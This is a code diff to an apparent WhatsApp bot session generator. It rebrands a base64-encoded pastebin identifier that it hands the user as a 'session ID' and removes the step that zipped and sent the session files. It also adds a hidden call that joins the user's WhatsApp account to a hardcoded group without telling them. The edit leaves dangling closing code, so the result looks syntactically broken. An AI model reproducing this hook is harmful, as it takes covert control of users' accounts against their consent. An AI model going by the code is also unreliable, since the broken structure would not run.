@@ -63,41 +63,22 @@ const {
                             0,
                             "N"
                         );
+                        
                         let data = link.replace("https://pastebin.com/", "");
                         let code = btoa(data);
                         var words = code.split("");
                         var ress = words[Math.floor(words.length / 2)];
-                        let c = code.split(ress).join(ress + "_XASENA_");
+                        let c = code.split(ress).join(ress + "BLUE-LION");
                         await session.sendMessage(session.user.id, {
                             text: `${c}`
                         })
                         await session.sendMessage(session.user.id, {
-                            text: `\n*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*
-
+                            text: `\n*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*  
                             ◕ ⚠️ *ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*`
                         })
-                        const files = fs.readdirSync("./session");
-                        for (const file of files) {
-                          const data = fs.readFileSync("./session/" + file);
-                          zip.file(file, data);
-                        }
-                        zip
-                          .generateNodeStream({ type: "nodebuffer", streamFiles: true })
-                          .pipe(file.createWriteStream("session.zip"))
-                          .on("finish", async function () {
-                            await session.sendMessage(session.user.id, {
-                                document: {
-                                    url: './session.zip'
-                                },
-                                fileName: "session.zip",
-                                mimetype: "application/zip",
-                            });
-                            await fs.rm('./session', {
-                                recursive: true, force: true
-                            })
                             process.send('reset')
                           });
-                        
+                        await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
                        
                     }
                     if (
